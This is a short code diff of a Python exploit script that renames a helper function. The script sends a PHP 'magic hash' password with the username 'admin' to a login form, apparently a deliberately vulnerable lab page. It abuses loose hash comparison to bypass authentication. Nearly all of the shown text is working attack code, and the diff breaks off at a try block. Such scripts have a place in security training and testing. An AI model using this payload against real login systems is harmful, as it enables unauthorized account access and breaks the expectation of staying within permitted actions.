@@ -1,12 +1,12 @@
 import requests
 import sys
 
-def php_magic_bytes():
+def php_magic_hashes():
 	print("[+] Returning php magic hashes whose md5 evaluate to 0")
 	return "aabg7XSs"
 
 def exploit(target):
-	payload=php_magic_bytes()
+	payload=php_magic_hashes()
 	data={"username":"admin","password":payload,"login":"Login+%28Vulnerable%29"}
 	url=target
 	try:
